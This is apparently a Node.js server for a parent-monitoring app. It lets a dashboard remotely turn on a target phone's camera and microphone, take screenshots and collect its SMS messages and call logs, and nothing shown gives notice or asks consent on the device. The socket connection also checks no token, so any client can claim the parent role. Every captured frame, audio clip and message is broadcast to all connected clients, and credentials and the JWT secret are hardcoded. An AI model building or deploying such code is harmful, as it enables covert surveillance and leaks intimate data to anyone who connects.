const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const path = require('path');
const os = require('os');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(cors());
app.use(express.json());

const JWT_SECRET = process.env.JWT_SECRET || 'change-this-secret-in-production';
const parentAccounts = [{ email: 'parent@example.com', password: 'changeme123' }];
const connectedDevices = {}; // deviceId -> { socketId, info, battery }

// ── Screenshot folder helper ──────────────────────────────────────
function getScreenshotFolder(deviceId) {
  const folder = path.join(os.homedir(), 'Desktop', 'MDM-Screenshots', deviceId);
  fs.mkdirSync(folder, { recursive: true });
  return folder;
}

// ── REST API ──────────────────────────────────────────────────────
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const account = parentAccounts.find(a => a.email === email && a.password === password);
  if (!account) return res.status(401).json({ error: 'Invalid credentials' });
  const token = jwt.sign({ email }, JWT_SECRET, { expiresIn: '7d' });
  res.json({ token });
});

app.get('/api/devices', authenticate, (req, res) => {
  const list = Object.keys(connectedDevices).map(id => ({
    deviceId: id,
    online: !!connectedDevices[id]?.socketId,
    info: connectedDevices[id]?.info || null,
    battery: connectedDevices[id]?.battery || null,
  }));
  res.json(list);
});

function authenticate(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth) return res.status(401).json({ error: 'No token' });
  try {
    req.user = jwt.verify(auth.split(' ')[1], JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

// ── Socket.io ─────────────────────────────────────────────────────
io.on('connection', socket => {
  const { role, deviceId } = socket.handshake.query;

  // ── Child device ─────────────────────────────────────────────
  if (role === 'child' && deviceId) {
    if (!connectedDevices[deviceId]) connectedDevices[deviceId] = {};
    connectedDevices[deviceId].socketId = socket.id;
    console.log(`Child connected: ${deviceId}`);
    socket.broadcast.emit('device:status', { deviceId, online: true });

    socket.on('disconnect', () => {
      if (connectedDevices[deviceId]) connectedDevices[deviceId].socketId = null;
      socket.broadcast.emit('device:status', { deviceId, online: false });
      console.log(`Child disconnected: ${deviceId}`);
    });

    // Camera frame → relay to parents
    socket.on('camera:frame', data => {
      io.emit('camera:frame', { deviceId, ...data });
    });

    // Screenshot data → save to Desktop + notify parents
    socket.on('screenshot:data', ({ frame }) => {
      try {
        const folder = getScreenshotFolder(deviceId);
        const ts = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `${ts}.jpg`;
        const filepath = path.join(folder, filename);
        fs.writeFileSync(filepath, Buffer.from(frame, 'base64'));
        console.log(`Screenshot saved: ${filepath}`);
        io.emit('screenshot:saved', { deviceId, filename, filepath, timestamp: Date.now() });
      } catch (err) {
        console.error('Screenshot save error:', err.message);
      }
    });

    // Mic events → relay to parents
    socket.on('mic:audio', data => io.emit('mic:audio', { deviceId, ...data }));
    socket.on('mic:state', data => io.emit('mic:state', { deviceId, ...data }));

    // Device info → store + relay
    socket.on('device:info', data => {
      if (connectedDevices[deviceId]) connectedDevices[deviceId].info = data;
      io.emit('device:info', { deviceId, ...data });
    });

    // Battery → store + relay
    socket.on('battery:update', data => {
      if (connectedDevices[deviceId]) connectedDevices[deviceId].battery = data;
      io.emit('battery:update', { deviceId, ...data });
    });

    // Call logs → relay to parents
    socket.on('call:logs', data => {
      io.emit('call:logs', { deviceId, ...data });
    });

    // SMS → relay to parents
    socket.on('sms:messages', data => {
      io.emit('sms:messages', { deviceId, ...data });
    });
  }

  // ── Parent dashboard ─────────────────────────────────────────
  if (role === 'parent') {
    console.log('Parent connected');

    function toChild(devId) {
      return connectedDevices[devId]?.socketId || null;
    }

    socket.on('cmd:camera:start',  ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:camera:start'); });
    socket.on('cmd:camera:stop',   ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:camera:stop'); });
    socket.on('cmd:mic:on',        ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:mic:on'); });
    socket.on('cmd:mic:off',       ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:mic:off'); });
    socket.on('cmd:speak',         ({ deviceId, audioData }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:speak', { audioData }); });
    socket.on('cmd:screenshot',    ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:screenshot'); });
    socket.on('cmd:get:calllogs',  ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:get:calllogs'); });
    socket.on('cmd:get:sms',       ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:get:sms'); });
  }
});

const PORT = process.env.PORT || 4000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
